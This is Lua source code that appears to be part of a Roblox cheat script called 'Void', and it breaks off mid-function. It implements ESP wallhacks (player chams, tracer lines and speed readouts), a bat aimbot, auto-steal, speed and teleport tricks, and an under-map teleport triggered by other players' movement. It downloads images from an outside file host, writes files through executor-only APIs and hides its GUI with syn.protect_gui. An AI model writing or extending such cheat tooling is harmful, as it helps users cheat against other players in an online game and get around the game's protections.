local autoLeftSetVisual,autoRightSetVisual=nil,nil
local speedLabel=nil
local autoBatEnabled=false
local batV2Enabled=false
local batV2Speed=56.5
local batV2Conn=nil
local batV2LastSwing=0
local mirrorTPDownEnabled=false
local MIRROR_TP_DROP_THRESHOLD=3
local MIRROR_TP_DOWN_Y=-7.00
local mirrorTPPreviousY={}
local mirrorTPLastTeleport=0

local function mirrorTPCombatActive()
    return (autoBatEnabled==true) or (batV2Enabled==true) or (RXZ and RXZ.batV2==true)
end

local function mirrorTPTeleportDown()
    local character=LP.Character
    local root=character and character:FindFirstChild("HumanoidRootPart")
    local humanoid=character and character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health<=0 then return end
    local now=tick()
    if now-(mirrorTPLastTeleport or 0)<0.08 then return end
    mirrorTPLastTeleport=now
    local _,yaw=root.CFrame:ToEulerAnglesYXZ()
    local y=(MIRROR_TP_DOWN_Y or -7)+(math.random()*0.6-0.3)
    root.CFrame=CFrame.new(root.Position.X,y,root.Position.Z)*CFrame.Angles(0,yaw,0)
    root.AssemblyLinearVelocity=Vector3.new((math.random()-0.5)*0.4,0,(math.random()-0.5)*0.4)
end

RunService.Heartbeat:Connect(function()
    if not mirrorTPDownEnabled or not mirrorTPCombatActive() then
        if next(mirrorTPPreviousY) then table.clear(mirrorTPPreviousY) end
        return
    end
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr~=LP and plr.Character then
            local root=plr.Character:FindFirstChild("HumanoidRootPart")
            if root then
                local currentY=root.Position.Y
                local previousY=mirrorTPPreviousY[plr.UserId]
                if previousY and previousY-currentY>=(MIRROR_TP_DROP_THRESHOLD or 3) then
                    pcall(mirrorTPTeleportDown)
                    table.clear(mirrorTPPreviousY)
                    return
                end
                mirrorTPPreviousY[plr.UserId]=currentY
            end
        end
    end
end)
-- VOID theme colors (Adapt-style)
local VoidThemeColors={
    WHITE  = Color3.fromRGB(255,255,255),
    PURPLE = Color3.fromRGB(207,159,255),
    BLUE   = Color3.fromRGB(58,128,245),
    RED    = Color3.fromRGB(232,52,68),
    PINK   = Color3.fromRGB(255,105,180),
    YELLOW = Color3.fromRGB(255,214,0),
    GREY   = Color3.fromRGB(90,90,90),
    FOREST = Color3.fromRGB(46,139,87),
}
local voidThemeName="WHITE"
local function getVoidAccent()
    return VoidThemeColors[voidThemeName] or VoidThemeColors.WHITE
end
local function _voidBlend(a,b,t)
    t=math.clamp(t or 0.5,0,1)
    return Color3.new(a.R+(b.R-a.R)*t, a.G+(b.G-a.G)*t, a.B+(b.B-a.B)*t)
end
local function applyVoidTheme()
    local accent=getVoidAccent()
    pcall(function()
        -- rebuild palette from accent (full menu recolor)
        if C then
            local dark=Color3.fromRGB(6,6,6)
            local darker=Color3.fromRGB(3,3,3)
            C.blue=accent
            C.blueDim=_voidBlend(accent,Color3.fromRGB(40,40,40),0.55)
            C.blueDark=_voidBlend(darker,accent,0.12)
            C.bg=_voidBlend(dark,accent,0.06)
            C.bgDark=_voidBlend(darker,accent,0.04)
            C.row=_voidBlend(Color3.fromRGB(16,16,16),accent,0.10)
            C.input=_voidBlend(Color3.fromRGB(16,16,16),accent,0.08)
            C.divider=_voidBlend(Color3.fromRGB(32,32,32),accent,0.25)
            C.text=Color3.fromRGB(255,255,255)
            C.textDim=_voidBlend(Color3.fromRGB(160,160,160),accent,0.25)
            C.textMuted=_voidBlend(Color3.fromRGB(100,100,100),accent,0.20)
            C.white=Color3.fromRGB(255,255,255)
        end

        local function paintTree(root)
            if not root then return end
            for _,d in ipairs(root:GetDescendants()) do
                -- title image
                if d.Name=="VoidTitle" and (d:IsA("ImageLabel") or d:IsA("ImageButton")) then
                    d.ImageColor3=accent
                end
                -- strokes → accent / tinted divider
                if d:IsA("UIStroke") then
                    local pn=d.Parent and d.Parent.Name or ""
                    if pn=="LogoCircle" or pn=="VoidOpenPill" or pn=="MiniBtn" then
                        d.Color=accent
                    elseif d.Thickness and d.Thickness>=1.5 then
                        d.Color=_voidBlend(Color3.fromRGB(45,45,45),accent,0.55)
                    else
                        d.Color=_voidBlend(C.divider,accent,0.35)
                    end
                end
                -- frames / buttons with dark row-like colors
                if d:IsA("Frame") or d:IsA("TextButton") or d:IsA("ImageButton") then
                    local bg=d.BackgroundColor3
                    if bg then
                        local r,g,b=bg.R*255,bg.G*255,bg.B*255
                        local avg=(r+g+b)/3
                        local sat=math.max(r,g,b)-math.min(r,g,b)
                        -- near-neutral dark UI → theme tint
                        if sat<35 and avg<55 then
                            d.BackgroundColor3=_voidBlend(Color3.fromRGB(r,g,b),accent,0.14)
                        elseif sat<40 and avg<90 then
                            d.BackgroundColor3=_voidBlend(Color3.fromRGB(r,g,b),accent,0.18)
                        end
                    end
                end
                -- labels: dim text gets accent wash; active/accent text → accent
                if d:IsA("TextLabel") or d:IsA("TextButton") then
                    local tc=d.TextColor3
                    if tc then
                        local r,g,b=tc.R*255,tc.G*255,tc.B*255
                        local avg=(r+g+b)/3
                        local sat=math.max(r,g,b)-math.min(r,g,b)
                        if sat<30 and avg>120 and avg<200 then
                            d.TextColor3=_voidBlend(Color3.fromRGB(r,g,b),accent,0.35)
                        elseif sat<25 and avg>=200 then
                            -- keep near-white
                        elseif sat>40 and avg>100 then
                            -- already colored → pull toward accent
                            d.TextColor3=_voidBlend(tc,accent,0.65)
                        end
                    end
                end
                -- tab / selected pills often use UIGradient or solid accent
                if d:IsA("UIGradient") and d.Parent then
                    -- leave gradients; strokes handle most chrome
                end
            end
        end

        if GuiRefs then
            if GuiRefs.outer then
                GuiRefs.outer.BackgroundColor3=C.bgDark
                paintTree(GuiRefs.outer)
            end
            if GuiRefs.inner then
                GuiRefs.inner.BackgroundColor3=C.bg
                paintTree(GuiRefs.inner)
            end
            if GuiRefs.chromeGroup then paintTree(GuiRefs.chromeGroup) end
            if GuiRefs.hub then paintTree(GuiRefs.hub) end
            if GuiRefs.bgGrad then
                GuiRefs.bgGrad.BackgroundColor3=C.bgDark
            end
            if GuiRefs.voidTitle then
                if GuiRefs.voidTitle:IsA("ImageLabel") or GuiRefs.voidTitle:IsA("ImageButton") then
                    GuiRefs.voidTitle.ImageColor3=accent
                elseif GuiRefs.voidTitle:IsA("TextLabel") then
                    GuiRefs.voidTitle.TextColor3=accent
                end
            end
            -- tab buttons
            if GuiRefs.categoryList then paintTree(GuiRefs.categoryList) end
            if GuiRefs.contentFrame then paintTree(GuiRefs.contentFrame) end
        end

        -- mobile pad
        if mobGuiRef then
            for _,d in ipairs(mobGuiRef:GetDescendants()) do
                if d:IsA("UIStroke") then d.Color=accent end
                if d:IsA("ImageLabel") and (d.Name=="BtnImage" or d.Name=="MobileBackgroundImage") then
                    d.ImageColor3=accent
                end
                if d:IsA("Frame") or d:IsA("TextButton") then
                    local bg=d.BackgroundColor3
                    if bg then
                        local r,g,b=bg.R*255,bg.G*255,bg.B*255
                        local avg=(r+g+b)/3
                        local sat=math.max(r,g,b)-math.min(r,g,b)
                        if sat<40 and avg<80 then
                            d.BackgroundColor3=_voidBlend(Color3.fromRGB(r,g,b),accent,0.16)
                        end
                    end
                end
            end
        end

        -- steal bar
        if stealBarFrame then
            local st=stealBarFrame:FindFirstChildOfClass("UIStroke")
            if st then st.Color=accent end
            for _,d in ipairs(stealBarFrame:GetDescendants()) do
                if d:IsA("UIStroke") then d.Color=_voidBlend(d.Color,accent,0.5) end
            end
        end
    end)
end


local aimbotAfterHitEnabled=false
local aimbotAfterHitDebounce=false
local autoSwingEnabled=true
local autoMoveSwingEnabled=false
local autoMoveSwingInterval=0.3
local _alSwingDebounce=false
local _arSwingDebounce=false
local autoBatSetVisual=nil
local resetAutoBatMotion=nil
local setBatCounterVisual=nil
local startBatCounter,stopBatCounter
local antiLagEnabled,removeAccessoriesEnabled,antiLagDescConn=false,false,nil
local stretchRezEnabled,stretchRezConn,setStretchRezVisual=false,nil,nil
local unwalkSavedAnimate,_anyKeyListening=nil,false
local autoTPEnabled,autoTPHeight,autoTPConn,setAutoTPVisual=false,20,nil,nil
local guiTransparencyEnabled,mobileButtonsEnabled,mobileButtonsLocked=false,true,false
local discordLinkEnabled=true
local discordLinkGuiRef=nil
local logoCircleEnabled=false
local logoCircleRef=nil
local mobileButtonsSize=80
local circleButtonsEnabled=false
local stealBarFrame
local stealBarStyle = 2 -- 1 = vertical, 2 = full
local stealBarScale = 1.0 -- size multiplier for steal bar
local mobBtnRefs={}
local mobGuiRef=nil
local fovValue=80
local fovOptions={80,120,180}
local fovIndex=1
local laggerModePillRef=nil
local carryModePillRef=nil
local autoSwitchSpeedEnabled=false
local animPackEnabled=false
local animPackName="OFF"
local headlessEnabled=false
local korbloxEnabled=false
local HEADLESS_MESH_ID = "rbxassetid://1095708"
local KORBLOX_MESH_ID = "rbxassetid://101851696"
local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
local DARK_GREY_COLOR = Color3.fromRGB(64, 64, 64)

local function removeFace(head)
    local face = head:FindFirstChild("face")
    if face then face:Destroy() end
end

function applyHeadlessToChar(char, enabled)
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    if enabled then
        head.Transparency = 1
        head.CanCollide = false
        removeFace(head)
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and (child.Name == "HeadlessMesh" or child.MeshId == HEADLESS_MESH_ID) then
                child:Destroy()
            end
        end
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = HEADLESS_MESH_ID
        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
        mesh.Name = "HeadlessMesh"
        mesh.Parent = head
        head:GetPropertyChangedSignal("Transparency"):Connect(function()
            if head.Transparency ~= 1 then head.Transparency = 1 end
        end)
        head.ChildAdded:Connect(function(child)
            if child.Name == "face" and child:IsA("Decal") then child:Destroy() end
        end)
    else
        head.Transparency = 0
        head.CanCollide = true
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.Name == "HeadlessMesh" then
                child:Destroy()
            end
        end
    end
end

function applyKorbloxToChar(char, enabled)
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    if enabled then
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then child:Destroy() end
                end
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = rightLeg
                rightLeg.Color = DARK_GREY_COLOR
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 1
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 1 end
                if rightFoot then rightFoot.Transparency = 1 end
                local oldKorblox = char:FindFirstChild("KorbloxLeg")
                if oldKorblox then oldKorblox:Destroy() end
                local korbloxLeg = Instance.new("Part")
                korbloxLeg.Name = "KorbloxLeg"
                korbloxLeg.Size = Vector3.new(1, 2, 1)
                korbloxLeg.Anchored = false
                korbloxLeg.CanCollide = false
                korbloxLeg.Color = DARK_GREY_COLOR
                korbloxLeg.Parent = char
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = korbloxLeg
                local weld = Instance.new("Weld")
                weld.Part0 = rightUpperLeg
                weld.Part1 = korbloxLeg
                weld.C0 = CFrame.new(0, -0.8, 0)
                weld.Name = "KorbloxWeld"
                weld.Parent = korbloxLeg
            end
        end
    else
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then child:Destroy() end
                end
                rightLeg.Color = Color3.fromRGB(255, 255, 255)
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 0
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 0 end
                if rightFoot then rightFoot.Transparency = 0 end
                local korbloxLeg = char:FindFirstChild("KorbloxLeg")
                if korbloxLeg then korbloxLeg:Destroy() end
            end
        end
    end
end

function applyCharterToChar(char)
    if not char then return end
    applyHeadlessToChar(char, headlessEnabled)
    applyKorbloxToChar(char, korbloxEnabled)
end
local ANIM_PACK_ORDER={"OFF","Adidas Sports","Adidas Community","Adidas Aura","Wicked Popular","Elder","Zombie","Mage","Catwalk Glam","Astronaut"}
local ANIM_PACKS={
    ["Adidas Sports"]={WalkAnim=18537392113,RunAnim=18537384940,JumpAnim=18537380791,FallAnim=18537367238,ClimbAnim=18537363391,Animation1=18537376492,Animation2=18537371272},
    ["Adidas Community"]={WalkAnim=122150855457006,RunAnim=82598234841035,JumpAnim=75290611992385,FallAnim=98600215928904,ClimbAnim=88763136693023,Animation1=122257458498464,Animation2=102357151005774},
    ["Adidas Aura"]={WalkAnim=83842218823011,RunAnim=118320322718866,JumpAnim=109996626521204,FallAnim=95603166884636,ClimbAnim=97824616490448,Animation1=110211186840347,Animation2=114191137265065},
    ["Wicked Popular"]={WalkAnim=92072849924640,RunAnim=72301599441680,JumpAnim=104325245285198,FallAnim=121152442762481,ClimbAnim=131326830509784,Animation1=118832222982049,Animation2=76049494037641},
    Elder={WalkAnim=10921111375,RunAnim=10921104374,JumpAnim=10921107367,FallAnim=10921105765,ClimbAnim=10921100400,Animation1=10921101664,Animation2=10921102574},
    Zombie={WalkAnim=10921355261,RunAnim=616163682,JumpAnim=10921351278,FallAnim=10921350320,ClimbAnim=10921343576,Animation1=10921344533,Animation2=10921345304},
    Mage={WalkAnim=10921152678,RunAnim=10921148209,JumpAnim=10921149743,FallAnim=10921148939,ClimbAnim=10921143404,Animation1=10921144709,Animation2=10921145797},
    ["Catwalk Glam"]={WalkAnim=109168724482748,RunAnim=81024476153754,JumpAnim=116936326516985,FallAnim=92294537340807,ClimbAnim=119377220967554,Animation1=133806214992291,Animation2=94970088341563},
    Astronaut={WalkAnim=10921046031,RunAnim=10921039308,JumpAnim=10921042494,FallAnim=10921040576,ClimbAnim=10921032124,Animation1=10921034824,Animation2=10921036806},
}
local _animOriginalIds={}
local mobBtnTransparencyEnabled=false
local perButtonDragEnabled=true
local brainrotDetected=false
local activeBatBillboard=nil
local activeMedusaBillboard=nil
local ragdollGuiEnabled=true
local persistentRagdollGui=nil
local uiLocked=false
local infJumpMode="manual"
local holdInfJumpConn=nil
local DROP_ASCEND_DURATION=0.2
local DROP_ASCEND_SPEED=150
local _GuiKeys = nil

-- ============================================================
-- CYBER EXTRAS
-- ============================================================
local espEnabled = false
local espAvatarsEnabled = true
local ESP = {folder=nil, conns={}, labels={}}
local backgroundEnabled = false
local backgroundIndex = 0
local bgImageRef = nil

local BG_IMAGE_URLS = {
    { url = "https://files.catbox.moe/pk5a3v.jpeg", file = "void_bg_1.jpeg" },
    { url = "https://files.catbox.moe/v8y0ak.png",  file = "void_bg_2.png" },
    { url = "https://files.catbox.moe/sl73hb.png",  file = "void_bg_3.png" },
    { url = "https://files.catbox.moe/ptt187.png",  file = "void_bg_4.png" },
}
local bgLoadedAssets = {}

local function resolveBgAsset(fileName)
    local assetFuncs = { getcustomasset, getsynasset, getasset }
    for _, func in ipairs(assetFuncs) do
        if typeof(func) == "function" then
            local ok, a = pcall(function() return func(fileName) end)
            if ok and type(a) == "string" and a ~= "" then return a end
        end
    end
    if typeof(getcustomasset) == "function" then
        local ok, a = pcall(function() return getcustomasset(fileName, true) end)
        if ok and type(a) == "string" and a ~= "" then return a end
    end
    return ""
end

local function downloadBgImage(entry)
    if isfile and isfile(entry.file) then
        local a = resolveBgAsset(entry.file)
        if a ~= "" then return a end
    end
    local raw = nil
    local ok, result = pcall(function() return game:HttpGet(entry.url) end)
    if ok and result and #result > 100 then raw = result end
    if not raw then
        local reqFunc = (http and http.request) or request or (syn and syn.request)
        if reqFunc then
            local res = reqFunc({ Url = entry.url, Method = "GET" })
            if res and res.Body and #res.Body > 100 then raw = res.Body end
        end
    end
    if not raw then return "" end
    pcall(function() writefile(entry.file, raw) end)
    task.wait(0.05)
    return resolveBgAsset(entry.file)
end

task.spawn(function()
    for i, entry in ipairs(BG_IMAGE_URLS) do
        local asset = downloadBgImage(entry)
        bgLoadedAssets[i] = (asset ~= "" and asset) or entry.url
    end
end)

function applyBackgroundImage(index)
    backgroundIndex = index or 0
    if not bgImageRef then return end
    if backgroundIndex == 0 then
        bgImageRef.Image = ""
        bgImageRef.Visible = false
        backgroundEnabled = false
        return
    end
    local asset = bgLoadedAssets[backgroundIndex]
    local entry = BG_IMAGE_URLS[backgroundIndex]
    if (not asset or asset == "") and entry then
        asset = downloadBgImage(entry)
        if asset == "" then asset = entry.url end
        bgLoadedAssets[backgroundIndex] = asset
    end
    if asset and asset ~= "" then
        bgImageRef.Image = asset
        bgImageRef.Visible = true
        backgroundEnabled = true
    end
end

-- ============================================================
-- ESP — Speed Counter + Avatars + Line + Chams (Highlight)
-- ============================================================
function espClear()
    for _,c in pairs(ESP.conns) do pcall(function() c:Disconnect() end) end
    ESP.conns = {}
    for _,data in pairs(ESP.labels) do
        pcall(function() if data.billboard then data.billboard:Destroy() end end)
        pcall(function() if data.avatarBillboard then data.avatarBillboard:Destroy() end end)
        pcall(function() if data.highlight then data.highlight:Destroy() end end)
        pcall(function() if data.line then data.line:Destroy() end end)
    end
    ESP.labels = {}
    if ESP.folder then pcall(function() ESP.folder:Destroy() end); ESP.folder=nil end
end

function espRemovePlayer(plr)
    if not ESP.labels[plr] then return end
    pcall(function() if ESP.labels[plr].billboard then ESP.labels[plr].billboard:Destroy() end end)
    pcall(function() if ESP.labels[plr].avatarBillboard then ESP.labels[plr].avatarBillboard:Destroy() end end)
    pcall(function() if ESP.labels[plr].highlight then ESP.labels[plr].highlight:Destroy() end end)
    pcall(function() if ESP.labels[plr].line then ESP.labels[plr].line:Destroy() end end)
    ESP.labels[plr] = nil
end

function espRefreshAvatars()
    local show = (espEnabled == true) and (espAvatarsEnabled == true)
    for plr, data in pairs(ESP.labels) do
        if data.avatarBillboard then
            data.avatarBillboard.Enabled = show
        end
    end
end

function espMakeLabel(plr)
    if not plr then return end
    espRemovePlayer(plr)

    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
    if not head then return end
    local isLocal = (plr == LP)

    -- AVATAR BILLBOARD (others only)
    local avBb = nil
    if not isLocal then
        avBb = Instance.new("BillboardGui")
        avBb.Name = "VoidESPAvatar"
        avBb.AlwaysOnTop = true
        avBb.Size = UDim2.new(0,48,0,48)
        avBb.StudsOffset = Vector3.new(0,5.0,0)
        avBb.MaxDistance = 2000
        avBb.Enabled = (espEnabled == true) and (espAvatarsEnabled == true)
        avBb.Parent = head

        local avRing = Instance.new("Frame", avBb)
        avRing.Size = UDim2.new(1,0,1,0)
        avRing.BackgroundColor3 = Color3.fromRGB(8,8,10)
        avRing.BorderSizePixel = 0
        Instance.new("UICorner", avRing).CornerRadius = UDim.new(1,0)
        local avStroke = Instance.new("UIStroke", avRing)
        avStroke.Color = Color3.fromRGB(255,255,255)
        avStroke.Thickness = 2
        local avImg = Instance.new("ImageLabel", avRing)
        avImg.Size = UDim2.new(1,-4,1,-4)
        avImg.Position = UDim2.new(0,2,0,2)
        avImg.BackgroundTransparency = 1
        avImg.Image = "rbxthumb://type=AvatarHeadShot&id="..tostring(plr.UserId).."&w=150&h=150"
        Instance.new("UICorner", avImg).CornerRadius = UDim.new(1,0)
    end

    -- SPEED BILLBOARD (all players including local)
    local bb = Instance.new("BillboardGui")
    bb.Name = "VoidESPSpeed"
    bb.AlwaysOnTop = true
    bb.Size = UDim2.new(0, 200, 0, 44)
    bb.StudsOffset = Vector3.new(0, isLocal and 3.0 or 3.6, 0)
    bb.MaxDistance = 2000
    bb.Parent = head

    local speedLbl = Instance.new("TextLabel")
    speedLbl.Name = "SpeedLabel"
    speedLbl.Size = UDim2.new(1,0,1,0)
    speedLbl.BackgroundTransparency = 1
    speedLbl.Text = "Speed: 0"
    speedLbl.Font = Enum.Font.GothamBlack
    speedLbl.TextSize = 22
    speedLbl.TextColor3 = isLocal and Color3.fromRGB(120,220,255) or Color3.fromRGB(255,255,255)
    speedLbl.TextStrokeTransparency = 0.2
    speedLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
    speedLbl.TextScaled = false
    speedLbl.Parent = bb

    local highlight, linePart = nil, nil
    if not isLocal then
        -- CHAMS
        highlight = Instance.new("Highlight")
        highlight.Name = "VoidChams"
        highlight.Adornee = char
        highlight.FillColor = Color3.fromRGB(255,255,255)
        highlight.FillTransparency = 0.55
        highlight.OutlineColor = Color3.fromRGB(255,255,255)
        highlight.OutlineTransparency = 0
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        pcall(function() highlight.Parent = ESP.folder or workspace end)

        -- LINE
        linePart = Instance.new("Part")
        linePart.Name = "VoidESPLine"
        linePart.Anchored = true
        linePart.CanCollide = false
        linePart.CanQuery = false
        linePart.CanTouch = false
        linePart.CastShadow = false
        linePart.Material = Enum.Material.Neon
        linePart.Color = Color3.fromRGB(255,255,255)
        linePart.Transparency = 0.2
        linePart.Size = Vector3.new(0.05,0.05,1)
        pcall(function() linePart.Parent = ESP.folder or workspace end)

        local lineConn = RunService.RenderStepped:Connect(function()
            if not espEnabled then return end
            local myChar = LP.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local tHRP = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head"))
            if not myHRP or not tHRP or not linePart or not linePart.Parent then return end
            local a = myHRP.Position
            local b = tHRP.Position
            local dist = (b - a).Magnitude
            linePart.Size = Vector3.new(0.05, 0.05, dist)
            linePart.CFrame = CFrame.lookAt((a+b)/2, b)
        end)
        table.insert(ESP.conns, lineConn)
    end

    -- Live speed update — horizontal studs/s (matches move speed)
    local speedConn = RunService.RenderStepped:Connect(function()
        if not espEnabled or not speedLbl or not speedLbl.Parent then return end
        local c = plr.Character
        local hrp = c and c:FindFirstChild("HumanoidRootPart")
        local hum = c and c:FindFirstChildOfClass("Humanoid")
        if not hrp then
            speedLbl.Text = "Speed: 0"
            return
        end
        local v = hrp.AssemblyLinearVelocity
        -- horizontal only so jumps don't skew the number
        local hx, hz = v.X, v.Z
        local spd = math.sqrt(hx*hx + hz*hz)
        -- local player: if script speed is active and moving, prefer target speed so it matches settings
        if isLocal and hum and not isRagdollState(hum) then
            local md = hum.MoveDirection
            if md.Magnitude > 0.05 and not autoBatEnabled and not autoLeftEnabled and not autoRightEnabled then
                local target = getActiveMoveSpeed and getActiveMoveSpeed() or nil
                if type(target) == "number" and target > 0 then
                    -- blend toward target so display matches what you set (61 etc.)
                    if spd > target * 0.55 then
                        spd = target
                    end
                end
            end
        end
        speedLbl.Text = string.format("Speed: %d", math.floor(spd + 0.5))
    end)
    table.insert(ESP.conns, speedConn)

    ESP.labels[plr] = {
        billboard = bb,
        avatarBillboard = avBb,
        highlight = highlight,
        line = linePart,
    }
end

function startESP()
    espEnabled = true
    espClear()
    ESP.folder = Instance.new("Folder")
    ESP.folder.Name = "VoidESPFolder"
    pcall(function() ESP.folder.Parent = workspace end)

    for _,plr in ipairs(Players:GetPlayers()) do
        espMakeLabel(plr)
        table.insert(ESP.conns, plr.CharacterAdded:Connect(function()
            task.wait(0.4)
            if espEnabled then espMakeLabel(plr) end
        end))
    end

    table.insert(ESP.conns, Players.PlayerAdded:Connect(function(plr)
        if not espEnabled then return end
        table.insert(ESP.conns, plr.CharacterAdded:Connect(function()
            task.wait(0.4)
            if espEnabled then espMakeLabel(plr) end
        end))
        if plr.Character then espMakeLabel(plr) end
    end))

    table.insert(ESP.conns, Players.PlayerRemoving:Connect(function(plr)
        espRemovePlayer(plr)
    end))
end

function stopESP()
    espEnabled = false
    espClear()
    -- also kill any orphan VoidESP billboards left in the world
    pcall(function()
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BillboardGui") and (obj.Name=="VoidESPAvatar" or obj.Name=="VoidESPSpeed" or obj.Name:find("VoidESP")) then
                obj:Destroy()
            end
            if obj:IsA("Highlight") and obj.Name and tostring(obj.Name):find("VoidESP") then
                obj:Destroy()
            end
        end
    end)
    pcall(function()
        for _, plr in ipairs(Players:GetPlayers()) do
            local char = plr.Character
            if char then
                for _, obj in ipairs(char:GetDescendants()) do
                    if obj:IsA("BillboardGui") and (obj.Name=="VoidESPAvatar" or obj.Name=="VoidESPSpeed" or obj.Name:find("VoidESP")) then
                        obj:Destroy()
                    end
                end
            end
        end
    end)
end

-- ============================================================
-- MOBILE BUTTON POSITIONS
-- ============================================================
local MOB_POS_FILE="RXZ_BtnPos.json"
function loadBtnPositions()
    if not(isfile and isfile(MOB_POS_FILE)) then return {} end
    local ok,data=pcall(function() return HS:JSONDecode(readfile(MOB_POS_FILE)) end)
    if ok and type(data)=="table" then return data end; return {}
end
function saveBtnPositions()
    if not writefile then return end; if not mobGuiRef then return end
    local grp=mobGuiRef:FindFirstChild("MobileButtons")
    if not grp then return end
    local out={__group={xs=grp.Position.X.Scale,xo=grp.Position.X.Offset,ys=grp.Position.Y.Scale,yo=grp.Position.Y.Offset}}
    for _,ch in ipairs(grp:GetChildren()) do
        if ch:IsA("Frame") then
            out[ch.Name]={xo=ch.Position.X.Offset,yo=ch.Position.Y.Offset}
        end
    end
    pcall(function() writefile(MOB_POS_FILE,HS:JSONEncode(out)) end)
end
task.spawn(function() while true do task.wait(3);pcall(saveBtnPositions) end end)

local refreshSpeedModeLabel,saveConfig
local startUnwalk,stopUnwalk,setupMedusa,stopMedusaCounter
local startAntiRagdoll,stopAntiRagdoll,startAutoLeft,stopAutoLeft,startAutoRight,stopAutoRight
local startAutoTP,stopAutoTP,enableAntiLag,disableAntiLag,enableStretchRez,disableStretchRez
local startBatAimbot,stopBatAimbot,queueAutoBatStart,runDrop,runTPFloor
local startAutoSteal,stopAutoSteal,toggleCarryMode,toggleLaggerMode

function addShimmerToLabel(lbl,color1,color2)
    local gr=Instance.new("UIGradient",lbl)
    gr.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,color1 or Color3.fromRGB(200,200,200)),ColorSequenceKeypoint.new(0.5,color2 or Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,color1 or Color3.fromRGB(200,200,200))})
    gr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0.3,0),NumberSequenceKeypoint.new(0.5,0,0),NumberSequenceKeypoint.new(1,0.3,0)})
    return gr
end

local fovConn=nil
function applyFOV()
    if fovConn then fovConn:Disconnect() end
    fovConn=RunService.RenderStepped:Connect(function()
        local cam=workspace.CurrentCamera; if cam then cam.FieldOfView=fovValue end
    end)
end
applyFOV()

function createRagdollBillboard(duration,labelText,color)
    if not ragdollGuiEnabled then return nil end
    local WHITE=Color3.fromRGB(255,255,255)
    local BG=Color3.fromRGB(12,5,10)
    local W,H=210,80
    local guiName="MoveeRagdollTimer_"..labelText
    pcall(function()
        local cg=game:GetService("CoreGui"); local old=cg:FindFirstChild(guiName); if old then old:Destroy() end
        local pg=LP:FindFirstChild("PlayerGui"); if pg then local o=pg:FindFirstChild(guiName); if o then o:Destroy() end end
    end)
    local sg=Instance.new("ScreenGui")
    sg.Name=guiName; sg.ResetOnSpawn=false; sg.IgnoreGuiInset=true; sg.DisplayOrder=25
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(sg) end end)
    if not pcall(function() sg.Parent=game:GetService("CoreGui") end) then sg.Parent=LP:WaitForChild("PlayerGui") end
    local card=Instance.new("Frame",sg)
    card.Size=UDim2.new(0,W,0,H); card.Position=UDim2.new(0.5,-W/2,0,58)
    card.BackgroundColor3=BG; card.BackgroundTransparency=1
    card.BorderSizePixel=0; card.ZIndex=30; card.Active=true
    Instance.new("UICorner",card).CornerRadius=UDim.new(0,14)
    local stroke=Instance.new("UIStroke",card)
    stroke.Color=WHITE; stroke.Thickness=3; stroke.Transparency=1
    task.spawn(function()
        local t=0
        while stroke and stroke.Parent do
            t=t+0.05
            stroke.Transparency=0.02+math.abs(math.sin(t*2.5))*0.25
            stroke.Color=Color3.fromRGB(255,255,255)
            task.wait(0.04)
        end
    end)
    local titleLbl=Instance.new("TextLabel",card)
    titleLbl.Size=UDim2.new(1,-16,0,28); titleLbl.Position=UDim2.new(0,8,0,6)
    titleLbl.BackgroundTransparency=1
    titleLbl.Text=(labelText=="RAGDOLL" and "RAGDOLL TIMER" or (labelText=="STONE" and "STONE TIMER" or labelText.." TIMER"))
    titleLbl.TextColor3=WHITE; titleLbl.Font=Enum.Font.GothamBlack; titleLbl.TextSize=13
    titleLbl.TextXAlignment=Enum.TextXAlignment.Center; titleLbl.ZIndex=32
    local divider=Instance.new("Frame",card)
